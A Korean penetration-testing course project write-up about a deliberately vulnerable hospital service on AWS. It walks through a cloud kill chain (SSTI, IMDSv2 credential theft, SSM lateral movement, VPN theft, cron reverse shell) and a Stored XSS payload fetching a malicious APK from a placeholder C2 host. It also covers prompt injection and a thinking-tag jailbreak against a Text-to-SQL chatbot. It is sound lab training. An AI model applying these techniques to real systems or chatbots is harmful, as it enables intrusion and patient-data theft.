---
title: "[최종 프로젝트]생성형 AI를 활용한 클라우드 기반 시나리오 모의해킹 — 프로젝트 전체 소개"
excerpt: "의도적으로 취약한 병원 웹/모바일 서비스를 AWS에 구축하고, 킬체인 기반 시나리오 3개를 설계·실행한 최종 프로젝트 소개"
categories: project
tags: [모의해킹, AWS, SSTI, IMDS, 프롬프트인젝션, 모바일해킹, 취약점진단, 'SK쉴더스 루키즈']
date: 2026-04-13
last_modified_at: 2026-04-13
published: true
typora-root-url: ../../../

---

## 프로젝트 개요

SK쉴더스 Rookies 28기 최종 실무 프로젝트로, **"생성형 AI를 활용한 클라우드 기반의 시나리오 모의해킹"**을 수행했다.

| 항목 | 내용 |
|------|------|
| 기간 | 2026.02.23 ~ 2026.04.12 (49일) |
| 팀 | 4조, 11명 |
| 멘토 | 장형욱 |
| 역할 | 인프라 담당 (AWS, VPN, 로컬 내부망 구축) |

의도적으로 취약한 대학병원 웹/모바일 서비스를 개발하고, AWS 클라우드에 배포한 뒤, 풀체인 기반 공격 시나리오 3개를 설계·실행하는 것이 목표였다. 단순히 취약점을 나열하는 것이 아니라, 하나의 취약점이 다음 공격으로 이어지는 **풀체인** 구조를 핵심으로 삼았다. 모든 과정은 교육 목적의 통제된 환경에서 수행되었다.

---

## 서비스 소개 — RKHospital

대학병원 클라우드 기반 진료 예약 및 의료 정보 관리 시스템이라는 테마로 구축했다. 환자가 온라인으로 진료를 예약하고, 진단서·처방전 등의 의료 문서를 관리하며, AI 챗봇을 통해 진료 관련 문의를 할 수 있는 서비스다.

**의료 테마를 선택한 이유:**
- 최근 의료기관 대상 침해사고가 급증하는 추세로 시의성이 있음 (KISA 기준 2020년 5건 → 2024년 57건, 약 11배 증가)
- 탈취 데이터의 민감도가 높아 시나리오 임팩트가 강함 (환자 개인정보, 주민번호, 진료/처방 기록)
- 환자↔의료진 간 권한 구분이 존재해 IDOR, 권한 상승 시나리오 설계에 적합


---

## 기술 스택

| 영역 | 기술 | 비고 |
|------|------|------|
| Frontend | React 19 + Vite 7 + TypeScript | SPA, React Router, Axios |
| Backend | Spring Boot 3.5.11 + Java 17 | REST API, JWT 인증(HMAC-SHA) |
| Reverse Proxy | Nginx | EC2 위에서 정적 파일 서빙 + 프록시 |
| Database | MySQL 8.0 | RDS (db.t3.small) |
| Mobile | Android Kotlin | Retrofit2 + Hilt + Room + Material 3 |
| Cloud | AWS | Route53, ALB, ACM, S3, SSM, Bedrock |
| IaC | Terraform | 전체 AWS 인프라 코드화 |
| EMR 인트라넷 | Spring Boot 3.2.3 + React 18 | 로컬 VM, 병원 내부 전자의무기록 시스템 |
| 공격 환경 | Kali Linux | Burp Suite, Frida, ADB, JADX, apktool 등 |

---

## 아키텍처

### AWS 클라우드 (3-Tier)

단일 VPC(`10.0.0.0/16`, ap-northeast-2) 내에 Public/Private 서브넷을 구성하고, ALB를 통해 HTTPS 트래픽을 경로 기반으로 라우팅하는 3-Tier 구조다.

![인프라 구조](/images/2026-04-13-[최종 프로젝트]-project-overview/인프라 구조.png)

**네트워크 구성:**

| 서브넷 | CIDR | AZ | 용도 |
|--------|------|----|------|
| Public A | 10.0.1.0/24 | ap-northeast-2a | ALB, Bastion, NAT Gateway |
| Public B | 10.0.2.0/24 | ap-northeast-2c | ALB (다중 AZ 요건 충족) |
| Private Main | 10.0.3.0/24 | ap-northeast-2a | Web EC2, API EC2, RDS |
| Private Ext | 10.0.4.0/24 | ap-northeast-2c | 확장용 예비 서브넷 |

ALB는 HTTPS 443으로 들어오는 트래픽을 경로 기반으로 분배한다. `/api/*` 요청은 API EC2(Spring Boot :8080)로, 나머지 `/*` 요청은 Web EC2(Nginx :80)로 전달한다. SSL/TLS 인증서는 ACM에서 발급받아 ALB에 연결했다.

**EC2 인스턴스 구성:**

| 인스턴스 | 유형 | 위치 | 역할 | 의도적 취약 설정 |
|----------|------|------|------|-----------------|
| Bastion | t3.micro | Public A | SSM 관리 + OpenVPN 서버 | OpenVPN 클라이언트 설정 파일을 /root에 보관 |
| Web EC2 | t3.medium | Private Main | Nginx + React 빌드 서빙 | **과다 권한 IAM Role** (S3FullAccess + SSM + BedrockFullAccess), IMDSv2 강제 |
| API EC2 | t3.medium | Private Main | Spring Boot REST API | 실행 인자에 RDS 크리덴셜 평문 노출 |

Web EC2에 과다 권한 IAM Role을 부여한 것은 의도적인 설계다. 시나리오 A에서 SSTI → IMDSv2 토큰 탈취 → IAM 자격증명 남용으로 이어지는 킬체인의 핵심 고리 역할을 한다. IMDSv2를 강제 적용하여 단순 GET 요청(SSRF)으로는 메타데이터에 접근할 수 없도록 했고, 이를 우회하기 위해 헤더 조작이 가능한 SSTI를 진입점으로 설계했다.

**주요 AWS 서비스:**

| 서비스 | 용도 |
|--------|------|
| Route 53 | DNS 관리 (`rkhospital.co.kr`) |
| ALB | HTTPS 종단 + 경로 기반 라우팅 |
| ACM | SSL/TLS 인증서 |
| S3 | 환자 문서 저장 (신분증, 진단서, 보험서류) — uploads 버킷은 의도적으로 퍼블릭 읽기 설정 |
| SSM | EC2 원격 관리 — 시나리오에서는 횡적 이동 경로로 악용 |
| Bedrock | Claude 3 Haiku 기반 AI 챗봇 + Text-to-SQL 기능 |
| CodeDeploy | web.zip, api.zip 자동 배포 |

보안 그룹 5개와 Network ACL 2개를 구성하여 서브넷 간 트래픽을 통제했다.

### 로컬 내부망 (VMware)

병원 사내망을 시뮬레이션하기 위해 VMware NAT 환경(`192.168.10.0/24`)에 Ubuntu VM 3대를 구성했다. AWS VPC와 물리적으로 분리된 별도의 네트워크이며, Bastion을 경유하는 OpenVPN 터널로 연결된다.

| 서버 | OS | IP | 역할 | 주요 서비스 |
|------|----|----|------|------------|
| GW-Server | Ubuntu 22.04 | 192.168.10.2 | AWS↔내부망 브리지 | OpenVPN 클라이언트, iptables NAT |
| EMR-Server | Ubuntu 24.04 | 192.168.10.3 | 전자의무기록 시스템 | Spring Boot WAS(:9090) + MySQL, 환자 진단/처방/접수 관리 |
| SVC-Server | Ubuntu 24.04 | 192.168.10.4 | 사내 인프라 서비스 | Sendmail, BIND9, vsftpd, Samba |

SVC-Server는 AWS에서 들어오는 트래픽만 수신하고, 외부로 나가는 outbound 트래픽은 없다. EMR-Server는 GW-Server(192.168.10.2)를 게이트웨이로 사용하여 AWS 서브넷과 통신한다.


### VPN 구성: OpenVPN + SSLH

AWS↔로컬 내부망 간 VPN 연결에서 가장 큰 과제는 학교 네트워크의 방화벽이었다. UDP가 전면 차단되고, AWS IP 대역 TCP 443도 막혀있어서 일반적인 VPN 구성이 불가능했다.

| 시도 | 구성 | 결과 |
|------|------|------|
| 1차 | WireGuard (UDP 51820) | 학교 망 UDP 전면 차단 → 실패 |
| 2차 | OpenVPN TCP 443 | AWS IP 대역 TCP 443도 차단 → 실패 |
| **최종** | **OpenVPN + SSLH (TCP 22)** | **통과 확인** |

최종 구성은 Bastion의 TCP 22 포트에 SSLH 멀티플렉서를 배치하여, SSH 트래픽은 내부 sshd(127.0.0.1:2222)로, OpenVPN 트래픽은 내부 openvpn(127.0.0.1:1194)으로 분기하는 방식이다. GW-Server가 이 터널을 통해 Bastion에 접속하면 VPN 터널(tun0)이 형성되고, 양쪽 네트워크의 라우팅이 push된다.

```
GW-Server (192.168.10.2)
  │ TCP 22
  ▼
Bastion (EIP)
  └─ SSLH (0.0.0.0:22)
       ├─ SSH 트래픽  → sshd (127.0.0.1:2222)
       └─ OpenVPN    → openvpn (127.0.0.1:1194)
                           │
                      tun0 (10.8.0.0/24)
                           │
              ┌────────────┴─────────────┐
        AWS VPC (10.0.0.0/16)     로컬 내부망 (192.168.10.0/24)
```

이 구성 덕분에 TCP 22 하나로 SSH 원격 관리와 VPN 터널링을 동시에 처리할 수 있었다. 자세한 구성 과정은 [별도 포스트](/project/최종-프로젝트-openvpn-sslh-vpn-setup/)에 정리해두었다.

---

## 공격 시나리오

멘토 가이드라인에 따라 시나리오 3개를 기반으로 구성했다. 클라이언트 공격은 뎁스 3~4단계, 서버/클라우드 공격은 뎁스 4단계 이상을 목표로 했으며, 범주가 겹치지 않도록 서버·클라우드 / 웹 / 모바일로 분배했다.

### 시나리오 A — 서버·클라우드 풀체인

웹 애플리케이션의 SSTI 취약점 하나를 시작으로, 클라우드 메타데이터 탈취 → IAM 권한 남용 → 횡적 이동 → VPN 탈취 → 내부망 침투 → 최종 데이터 탈취까지 이어지는 8단계 심층 킬체인이다. 프로젝트의 메인 시나리오로, 외부 웹 서비스에서 시작해 물리적으로 분리된 사내망의 EMR DB까지 도달하는 전체 공격 경로를 시연한다.

![시나리오3(인프라) 다이어그램](/images/2026-04-13-[최종 프로젝트]-project-overview/시나리오3(인프라) 다이어그램.png)

**Stage 1 — SSTI를 통한 초기 침투**

회원가입 시 이메일 인증번호를 요청하는 기능에서, 이름(name) 파라미터가 Thymeleaf 이메일 템플릿에 무해화(sanitization) 없이 삽입된다. 공격자가 이름 필드에 템플릿 구문을 삽입하면 서버 측에서 코드가 실행되어 임의의 HTTP 요청을 보낼 수 있다. 이 SSTI가 단순 RCE에 그치지 않고 중요한 이유는, **PUT/GET 요청 시 커스텀 헤더를 포함할 수 있다는 점**이다. 이것이 Stage 2의 IMDSv2 우회로 직결된다.

**Stage 2 — IMDSv2 토큰 추출 및 IAM 자격증명 탈취**

AWS EC2의 메타데이터 서비스(IMDS)에서 IAM 임시 자격증명을 탈취한다. 이 EC2에는 IMDSv2가 강제 적용되어 있어서, 단순 GET 요청(일반적인 SSRF)으로는 메타데이터에 접근할 수 없다. IMDSv2는 먼저 PUT 요청으로 토큰을 발급받고, 그 토큰을 헤더에 포함하여 GET 요청을 보내는 2단계 과정을 거쳐야 한다. Stage 1의 SSTI가 헤더 조작을 지원하기 때문에 이 2단계 요청을 수행할 수 있었고, 결과적으로 AccessKeyId + SecretAccessKey + SessionToken 3종의 STS 임시 자격증명을 탈취했다.

**Stage 3 — IAM 자격증명 검증**

탈취한 임시 자격증명을 공격자 머신(Kali)에 환경변수로 등록하고, `aws sts get-caller-identity`로 어떤 권한을 가진 Role인지 확인한다. 결과적으로 이 Role은 S3FullAccess + SSM SendCommand + BedrockFullAccess라는 과다한 권한을 가지고 있었다. 최소 권한 원칙이 지켜지지 않은 것이 이후 모든 공격의 근본 원인이 된다.

**Stage 4 — 클라우드 권한 남용 (S3 문서 탈취 + Bedrock 무단 호출)**

탈취한 IAM 자격증명으로 두 가지 공격을 수행한다. 첫째, S3 버킷에서 환자 민감 문서(신분증, 진단서, 보험청구서, 처방전, 검사결과) 10건을 다운로드한다. 둘째, Bedrock에서 Claude 3 Haiku 모델을 무단으로 호출하여 AI 서비스를 악용할 수 있음을 확인한다. `bedrock:List*` 권한이 없어 모델 목록을 조회할 수는 없었지만, 모델 ID를 직접 지정하여 호출을 시도했고 Haiku가 활성화 상태임을 확인했다.

**Stage 5 — SSM 횡적 이동 → API EC2 셸 → RDS DB 덤프**

SSM SendCommand 권한을 이용해 SSH 없이 Private Subnet의 EC2에 셸을 획득한다. `ssm:DescribeInstanceInformation`으로 관리 대상 인스턴스 3대를 식별하고, API EC2에 세션을 열었다. `ps aux`로 실행 중인 프로세스를 확인하자 Spring Boot 실행 인자에 RDS 크리덴셜이 평문으로 노출되어 있었다. 이 크리덴셜로 RDS에 접속하여 `medclinic` DB 전체(환자 이름, 생년월일, 연락처, 이메일, 주소, bcrypt 패스워드 해시)를 덤프했다.

**Stage 6 — Bastion 침투 → OpenVPN 설정 파일 탈취**

같은 SSM 권한으로 Bastion에도 세션을 열었다. `ifconfig`에서 tun0 인터페이스(VPN 터널)가 동작 중임을 확인하고, 라우팅 테이블에서 `192.168.10.0/24` 대역이 VPN을 통해 연결되어 있다는 것을 파악했다. 즉, AWS 외부에 별도의 사내망이 존재한다는 것이다. `/root` 디렉토리를 탐색하자 OpenVPN 클라이언트 설정 파일(`gw-vm.ovpn`)이 발견되었는데, 이 파일 안에 인증서, 개인키, CA, TLS-crypt 키가 모두 포함된 완전한 VPN 접속 파일이었다.

**Stage 7 — 공격자 VPN 접속 → 내부망 라우팅 획득**

탈취한 ovpn 파일을 Kali에서 사용하여 내부망에 VPN 접속한다. Bastion의 SSLH가 TCP 22에서 동작하므로 ovpn 파일의 포트를 1194에서 22로 수정했다. 접속 후 Kali에 `tun0: 10.8.0.3`이 할당되고, `192.168.10.0/24` 대역으로의 라우팅이 자동으로 push되어 내부망 서버들에 직접 접근할 수 있게 되었다.

**Stage 8 — 내부망 침투 및 최종 데이터 탈취**

내부망 침투는 4개 단계로 진행된다.

**8-1.** Bastion의 `/root/.ssh/id_rsa`를 탈취하여 GW-Server에 SSH 접속한다. GW-Server의 `bash_history`를 열람하자 Samba 접속 명령에 평문 패스워드가 남아있었다.

**8-2.** 발견된 Samba 크리덴셜로 SVC-Server의 it-ops 공유 폴더에 접속한다. KeePass DB 파일(`credentials.kdbx`)이 존재했지만 root 소유로 읽기 불가 — 권한 상승이 필요하다.

**8-3.** Samba 계정과 Linux 시스템 계정이 동일한 패스워드를 사용하고 있어(크리덴셜 재사용), SSH로 SVC-Server에 진입한다. root의 crontab을 확인하니 1분 주기로 백업 스크립트를 실행하고 있었는데, 이 스크립트의 파일 권한이 일반 유저 쓰기가 가능했다. 스크립트에 리버스 셸 페이로드를 삽입하고 Kali에서 리스너를 대기시키면, cron이 root 권한으로 스크립트를 실행할 때 root 셸을 획득할 수 있다.

**8-4.** root 권한으로 `credentials.kdbx`를 탈취하고, Kali에서 `keepass2john` + `john`(rockyou.txt)으로 마스터 패스워드를 크래킹한다. KeePass 안에는 내부망 전체 서버의 SSH/DB 크리덴셜 4건이 저장되어 있었다.

**8-5.** KeePass에서 획득한 EMR-Server SSH/MySQL 크리덴셜로 EMR-Server에 접속하여, `emr` DB의 진단 기록(진단명, 진료 소견, 진료비)과 처방 내역(약물명, 용량, 복용법)을 전체 덤프한다. Stage 5의 RDS가 환자 인적사항이었다면, 이 EMR DB는 **실제 진료·처방 기록**으로 의료 민감 정보의 최종 목표에 해당한다.

### 시나리오 B — 웹 특화: Text-to-SQL 프롬프트 인젝션 (4단계)

생성형 AI(Bedrock Claude 3 Haiku) 기반 Text-to-SQL 챗봇 기능을 프롬프트 인젝션으로 악용하는 시나리오다. 프로젝트 제목인 "생성형 AI를 활용한"의 핵심으로, **AI 자체가 공격 표면**이 되는 시나리오이기도 하다.

<!-- TODO: 시나리오 B 흐름도 이미지 추가 -->

**Stage 1 — Text-to-SQL 프롬프트 인젝션**

챗봇은 사용자의 자연어 질문을 SQL로 변환하여 DB를 조회하는 Text-to-SQL 기능을 제공한다. 여기에 프롬프트 인젝션을 수행하면 시스템 프롬프트를 오버라이드할 수 있고, thinking 태그 기반 탈옥을 통해 임의의 SQL 쿼리를 실행시킬 수 있다. "DB 조회해"라는 입력으로 `information_schema.tables`를 전체 조회하여 DB 스키마를 노출시키는 데 성공했다.

**Stage 2 — 환자 개인정보 대량 유출**

노출된 스키마를 기반으로 `patient` 테이블을 조회하여 환자 전체 정보(이름, 생년월일, 연락처, 이메일, bcrypt 해시 패스워드, SHA-256 해시 주민번호)를 탈취한다. 주민번호는 SHA-256으로 해싱되어 있지만 **솔트가 미적용**되어 있어, 주민번호의 형식(YYMMDD-GXXXXXX)상 경우의 수가 제한적이므로 레인보우 테이블 공격으로 평문 복원이 가능하다. `patient_num` 기반 조건 조회를 통해 타 환자의 진단 기록과 처방 내역까지 열람할 수 있었다.

**Stage 3 — 관리자 계정 장악**

DML 필터링이 없다는 점을 이용하여 SQL UPDATE까지 실행한다. 먼저 "내 환자 정보 출력해줘"로 자신의 bcrypt 해시값을 확인하고, "role이 ADMIN인 계정만 출력해줘"로 관리자 계정 정보를 알아낸 뒤, "password_hash를 (내 해시값)으로 변경해줘"라고 입력하면 AI가 UPDATE 쿼리를 실행하여 관리자의 비밀번호를 공격자가 아는 비밀번호로 덮어쓴다. bcrypt 크래킹 없이 해시 치환만으로 계정을 장악하는 방식이다.

**Stage 4 — 랜섬웨어 배포**

장악한 관리자 계정으로 로그인하면 공지사항 게시판에 파일을 업로드할 수 있는 관리자 전용 기능에 접근할 수 있다. Burp Suite 프록시로 업로드 요청을 인터셉트하여 파일 확장자를 `.exe`로 변조하면, 서버 측 확장자/MIME 검증이 미흡하여 정상적으로 업로드된다. 공지사항에 게시된 랜섬웨어 파일을 환자나 직원이 다운로드하면 감염된다. 해당 랜섬웨어는 최신 Windows Defender와 알약을 우회하는 것이 확인되었다.

### 시나리오 C — 모바일 특화: 악성 APK를 통한 C2 원격 제어 (4단계)

웹 취약점(Stored XSS)을 트리거로 모바일 앱의 JS Bridge를 악용하여, 악성 APK를 다운로드·설치시키고 C2 서버로 기기를 원격 제어하는 공격 체인이다.

<!-- TODO: 시나리오 C 흐름도 이미지 추가 -->

**Stage 1 — 앱 정적 분석 + XSS를 통한 JS Bridge 호출**

JADX로 RKHospital APK를 디컴파일하여 `@JavascriptInterface` 어노테이션을 검색하면 4개의 JS Bridge가 식별된다. 그 중 `downloadFile` bridge는 URL과 파일명을 인자로 받아 파일 다운로드를 수행한다. 이 bridge를 호출하기 위해 일반 유저가 접근 가능한 칭찬 게시판의 Stored XSS 취약점을 활용한다. 게시글에 `<script>AndroidApp.downloadFile('https://[C2-SERVER]/static/app-debug.apk','securityapp.apk');</script>` 페이로드를 삽입하면, 다른 사용자가 해당 게시글을 열었을 때 악성 APK가 자동으로 다운로드된다.

**Stage 2 — 악성 APK 설치 유도**

다운로드되는 APK는 원본 RKHospital 앱을 apktool로 디컴파일한 뒤, smali 코드를 수정하여 C2 통신 코드를 삽입하고 재빌드한 리패키징 APK다. 외관과 기능은 원본과 동일하지만 백그라운드에서 C2 서버와 통신한다. `showNotice` bridge를 연계하여 "보안 패치가 필요합니다" 같은 팝업을 띄우면 설치 유도의 개연성을 확보할 수 있다.

**Stage 3 — C2 서버 연결 + 기기 정보 수집**

설치된 악성 APK는 원본 앱이 선언한 과도한 권한(CAMERA, READ/WRITE_EXTERNAL_STORAGE 등)을 그대로 악용한다. 앱 실행 후 권한을 허용하면 C2 서버에 기기가 등록되고, 최초 1회 자동으로 연락처, 사진, 파일 목록 등의 데이터를 수집하여 전송한다. 앱을 종료해도 백그라운드 서비스로 동작이 지속된다.

**Stage 4 — C2 원격 제어 + 실시간 카메라 스트리밍**

C2 대시보드에서 등록된 기기 목록을 확인하고, FCM(Firebase Cloud Messaging)을 통해 원격 명령을 전송한다. 원하는 시점에 기기 데이터를 다시 수집하거나, WebSocket 기반의 실시간 카메라 스트리밍을 활성화할 수 있다. CAMERA 권한이 이미 허용되어 있으므로 별도의 추가 허용 없이 카메라에 접근 가능하다.

---

## 취약점 진단 결과

주요정보통신기반시설 기술적 취약점 분석·평가 가이드(주통기) 기준으로 블랙박스 테스트를 수행했다.

| 구분 | 총 항목 | 양호 | 취약 | 취약률 |
|------|---------|------|------|--------|
| 웹 | 23 | 15 | **8** | 34.8% |
| 모바일 | 22 | 7 | **15** | 68.2% |
| 합계 | 45 | 22 | **23** | 51.1% |

**웹 주요 취약 항목:** SSTI, SSRF, Stored XSS, 불충분한 권한 검증, 취약한 비밀번호 정책, 자동화 공격 통제 미흡, 시스템 정보 노출, HSTS 미적용

**모바일 주요 취약 항목:** 루팅 탐지 우회, 난독화 미흡, Frida 탐지 우회, 리패키징, 로컬 평문 저장, 메모리/로그 정보 노출, 캡처/백그라운드 보호 미흡, 백업 허용, 딥링크 도용, 과도한 권한 요청

> 클라우드(CLD) 및 인프라(INF) 취약점은 별도 진단 항목으로 분류하지 않고, 킬체인 시나리오 내에서 공격 경로의 일부로 다루었다.

---

## 마무리

49일간 인프라 설계부터 공격 시나리오 실행, 보고서 작성까지 전 과정을 경험한 프로젝트였다. 인프라 담당으로서 AWS 환경 구축과 VPN/내부망 설계를 맡았는데, 특히 학교 네트워크 제약을 SSLH로 해결하는 과정이나 IMDSv2 환경에서의 SSTI 체인 설계가 기억에 남는다.
